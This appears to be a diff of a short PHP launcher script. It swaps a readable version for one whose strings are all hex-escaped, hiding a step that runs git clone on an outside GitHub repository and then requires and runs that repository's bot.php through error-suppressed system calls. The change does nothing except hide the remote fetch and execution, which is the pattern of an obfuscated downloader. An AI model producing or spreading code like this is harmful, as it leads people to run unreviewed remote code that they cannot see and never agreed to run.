@@ -1,24 +1,7 @@
 <?php 
-    @system("clear");
-	$check_dir=true;
-if($check_dir){
-    $dir = ("veeu");
-if (is_dir($dir)) {
-    //echo "каталог $dir найден\n\n";
-	//sleep(1);
-	chdir('veeu');
-	sleep(1);
-    require"bot.php";
-	} 
-else 
-    {
-    //echo "каталог $dir не найден\n\n";
-    //sleep(1);
-	@system("git clone https://github.com/traidun90/veeu");
-	sleep(1);
-	chdir('veeu');
-	sleep(1);
-    require"bot.php";
-    }
-	}
+@system("\x63\x6c\x65a\x72");$y=true;if($y){$c = ("\x76\x65\x65u");if(is_dir($c)) {chdir("\x76\x65\x65\x75");sleep(1);require"\x62\x6f\x74.\x70\x68\x70";
+}
+else
+{@system("\x67\x69\x74 \x63\x6c\x6fn\x65\x20\x68\x74t\x70\x73\x3a/\x2f\x67\x69t\x68\x75b\x2e\x63\x6f\x6d\x2ft\x72a\x69d\x75n\x390\x2f\x76e\x65u");
+sleep(1);chdir("\x76\x65\x65\x75");sleep(1);require"\x62\x6f\x74.\x70\x68\x70";}}
 ?>
